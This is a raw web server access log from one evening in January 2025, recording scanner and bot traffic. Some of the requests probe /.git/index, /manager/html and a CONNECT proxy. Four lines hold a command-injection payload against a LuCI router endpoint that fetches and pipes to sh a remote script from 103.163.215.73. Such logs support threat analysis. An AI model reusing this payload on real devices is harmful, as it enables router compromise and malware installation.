195.3.223.55 - - [13/Jan/2025:17:09:10 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
20.225.0.9 - - [13/Jan/2025:17:26:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
179.43.191.146 - - [13/Jan/2025:17:31:03 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.16.39.104 - - [13/Jan/2025:17:32:54 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
31.220.1.144 - - [13/Jan/2025:17:34:06 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
31.220.1.144 - - [13/Jan/2025:17:34:06 +0000] "GET / HTTP/1.1" 200 1742 "http://34.48.126.28:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
80.82.77.202 - - [13/Jan/2025:17:51:39 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; Linux i686; rv:43.0) Gecko/20100101 Firefox/43.0"
178.215.236.132 - - [13/Jan/2025:18:04:27 +0000] "GET /.git/index HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
205.210.31.244 - - [13/Jan/2025:18:41:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
31.220.1.144 - - [13/Jan/2025:18:43:35 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60) HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
31.220.1.144 - - [13/Jan/2025:18:43:36 +0000] "GET / HTTP/1.1" 200 1742 "http://34.48.126.28:80/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.163.215.73%2Fmoo+-O-+|+sh%60)" "Go-http-client/1.1"
210.179.78.217 - - [13/Jan/2025:19:09:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
46.19.138.234 - - [13/Jan/2025:19:26:30 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.34.212.75 - - [13/Jan/2025:19:52:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
62.84.100.218 - - [13/Jan/2025:20:10:23 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0"
159.65.113.181 - - [13/Jan/2025:20:11:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809 Safari/537.36"
205.210.31.218 - - [13/Jan/2025:20:43:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
4.156.21.180 - - [13/Jan/2025:20:49:35 +0000] "GET /manager/html HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
34.22.192.129 - - [13/Jan/2025:20:50:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
185.10.68.236 - - [13/Jan/2025:21:40:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
150.246.147.224 - - [13/Jan/2025:21:44:47 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
95.214.55.226 - - [13/Jan/2025:22:00:58 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
153.205.129.34 - - [13/Jan/2025:22:13:47 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [13/Jan/2025:22:30:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
195.3.223.55 - - [13/Jan/2025:22:34:33 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
185.16.39.104 - - [13/Jan/2025:22:47:11 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
154.213.184.23 - - [13/Jan/2025:22:53:57 +0000] "CONNECT web.realsysadm.in:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
117.241.204.38 - - [13/Jan/2025:23:17:13 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
83.222.191.146 - - [13/Jan/2025:23:38:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
